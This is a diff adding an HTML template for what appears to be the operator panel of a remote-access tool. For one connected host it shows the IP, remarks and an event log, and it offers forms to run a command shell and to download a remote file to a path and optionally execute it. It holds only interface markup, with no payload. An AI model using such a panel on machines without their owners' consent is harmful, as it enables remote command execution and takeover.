@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="utf-8">
+    <title>Manager</title>
+    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.css">
+    <script src="/static/js/jquery-3.3.1.js"></script>
+    <script src="/static/js/bootstrap.js"></script>
+    <script src="/static/js/base64.js"></script>
+    <style>
+        .t {
+            background-color: red;
+            width: 400px;
+            height: 400px;
+
+            /*此元素会作为一个表格单元格显示
+            （类似 <td> 和 <th>）*/
+            display: table-cell;
+            /*垂直居中 */
+            vertical-align: middle;
+            /*水平居中*/
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-header">
+        <h2 class="text-center">Manager : {{ conn.ip }} / {{conn.info.remarks}}</h2>
+    </div>
+    <div style="text-align: center;" id="cmdcommand" class="tab-pane fade in active">
+            <label>
+                <textarea id="cmd_textarea" rows="15" style="width: 95%" disabled="disabled">
+                    {% for i in events %}
+                        {{ i }}
+                    {% endfor %}
+                </textarea>
+            </label>
+            
+    </div>
+
+<center>
+    <div id="shell"  class="t">
+        <h3>Cmd Shell</h3>
+        <br>
+        <form action="?action=shell" method="POST">
+            <label>
+                应用地址：<input id="target" type="text" >
+                <br>
+                携带参数：<input id="param" type="text">
+                <br>
+                <input type="submit" value="提交">
+            </label>
+        </form>
+        
+       
+    </div>
+
+    <div id="remark" class="t">
+        <h3>修改备注</h3>
+        <br>
+        <form action="?action=remark" method="POST">
+            更改备注：<input id="remark_input" type="text">
+            <br>
+            <input type="submit" value="提交">
+        </form>
+    </div>
+
+
+
+
+    <div id="download" class="t">
+        <h3>下载文件</h3>
+        <br>
+        远程地址：<input id="http" type="text">
+        <br>
+        保存路径：<input id="path" type="text">
+        <br>
+        是否运行：<select id="is_run">
+                    <option value="yes">是</option>
+                    <option value="no">否</option>
+                </select>
+            <br>
+        <input type="submit" value="提交">
+    </div>
+</center>
+
+</body>
